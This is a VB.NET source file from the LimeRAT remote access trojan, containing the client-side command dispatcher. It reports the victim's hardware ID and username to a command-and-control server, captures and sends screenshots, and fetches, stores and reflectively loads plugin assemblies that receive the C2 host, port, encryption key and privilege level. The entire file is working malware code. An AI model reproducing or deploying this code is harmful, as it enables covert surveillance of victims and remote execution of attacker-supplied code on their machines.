Namespace Lime

    Public Class C_Commands

        Private Shared SPL = C_Settings.SPL

        Public Shared Sub Data(ByVal b As Byte())
            Try : C_TcpClient.Send("OK" + SPL + C_ID.HWID + SPL + C_ID.UserName) : Catch : End Try

            Dim EN As String = C_Encryption.AES_Decrypt(BS(b))
            Dim A As String() = Split(EN, SPL)

            Try
                Select Case A(0)

                    Case "!PSend" 'Ask client to run timer
                        C_TcpClient.P_Start = True
                        C_TcpClient.Send("!PStart")

                    Case "!P" 'Ask client to stop timer
                        C_TcpClient.P_Stop = True

                    Case "!CAP" 'Thumbnail
                        Try
                            Dim bounds As Drawing.Rectangle = Windows.Forms.Screen.PrimaryScreen.Bounds
                            Dim image As New Drawing.Bitmap(Windows.Forms.Screen.PrimaryScreen.Bounds.Width, bounds.Height, Drawing.Imaging.PixelFormat.Format16bppRgb555)
                            Dim _g As Drawing.Graphics = Drawing.Graphics.FromImage(image)
                            Dim blockRegionSize As New Drawing.Size(image.Width, image.Height)
                            _g.CopyFromScreen(0, 0, 0, 0, blockRegionSize, Drawing.CopyPixelOperation.SourceCopy)
                            Dim MM As New IO.MemoryStream
                            Dim THU As New Drawing.Bitmap(256, 156)
                            Dim G As Drawing.Graphics = Drawing.Graphics.FromImage(THU)
                            G.DrawImage(image, New Drawing.Rectangle(0, 0, 256, 156), New Drawing.Rectangle(0, 0, image.Width, image.Height), Drawing.GraphicsUnit.Pixel)
                            THU.Save(MM, System.Drawing.Imaging.ImageFormat.Jpeg)
                            C_TcpClient.Send("#CAP" & SPL & C_ID.Bot & SPL & Text.Encoding.Default.GetString(MM.ToArray))
                            Try
                                _g.Dispose()
                                MM.Dispose()
                                THU.Dispose()
                                G.Dispose()
                                image.Dispose()
                            Catch : End Try
                        Catch ex As Exception
                        End Try

                    Case "CPL" 'check if plugin in installed, or ask server to send it
                        If GTV(A(1)) = Nothing Then
                            Diagnostics.Debug.WriteLine(A(1))
                            C_TcpClient.Send("GPL" + SPL + A(1))
                        Else
                            Diagnostics.Debug.WriteLine("Invoked")
                            Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
                        End If

                    Case "IPL" 'server send plugin. save it then load it
                        STV(A(2), A(1))
                        Plugin(GZip(Convert.FromBase64String(GTV(A(2))), False))

                    Case "IPLM" 'server send plugin. load it without saving it.
                        Plugin(GZip(Convert.FromBase64String(A(1)), False), A(2))
                End Select
            Catch ex As Exception
                C_TcpClient.Send("MSG" + SPL + "Error! " + ex.Message)
            End Try

        End Sub

        'I can change this method with better one but I have to re-write plugins method name.
        'Also if you update this method you have to use old LimeRAT to update your clients.
        Public Shared Sub Plugin(ByVal B() As Byte, Optional CMD As String = Nothing)
            Try
                For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                    For Each GM In Type_.GetMethods
                        If GM.Name = "CN" Then
                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_TcpClient.ENDOF, C_TcpClient.SPL, C_Settings.EncryptionKey, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                        ElseIf GM.Name = "MISC" Then
                            GM.Invoke(Nothing, New Object() {C_ID.HWID, CMD})
                        ElseIf GM.Name = "CL" Then
                            GM.Invoke(Nothing, New Object() {C_Settings.DROP, C_Settings.EXE, C_Settings.fullpath, C_ID.Privileges, C_ID.HWID, CMD})
                        End If
                    Next
                Next
            Catch ex As Exception
                C_TcpClient.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
            End Try
        End Sub

    End Class

End Namespace